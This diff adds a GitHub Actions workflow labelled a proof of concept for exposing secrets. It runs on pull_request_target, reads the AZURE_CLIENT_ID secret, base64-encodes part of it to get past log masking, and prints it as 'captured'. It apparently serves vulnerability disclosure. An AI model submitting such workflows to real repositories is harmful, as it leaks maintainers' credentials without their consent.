@@ -1,0 +1,27 @@
+name: PoC - Secret Exposure Test
+
+on:
+  pull_request_target:
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Show workflow context
+        run: |
+          echo "Running as: $(whoami)"
+          echo "Repo: $GITHUB_REPOSITORY"
+          echo "Event: $GITHUB_EVENT_NAME"
+
+      - name: Attempt secret access (safe, masked)
+        env:
+          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
+        run: |
+          # Extract prefix/suffix safely without exposing full value
+          PREFIX=$(echo -n "$AZURE_CLIENT_ID" | cut -c1-5)
+          SUFFIX=$(echo -n "$AZURE_CLIENT_ID" | rev | cut -c1-5 | rev)
+
+          # Encode in base64 to prove capture
+          ENCODED=$(echo -n "${PREFIX}****${SUFFIX}" | base64)
+
+          echo "Captured (base64): $ENCODED"
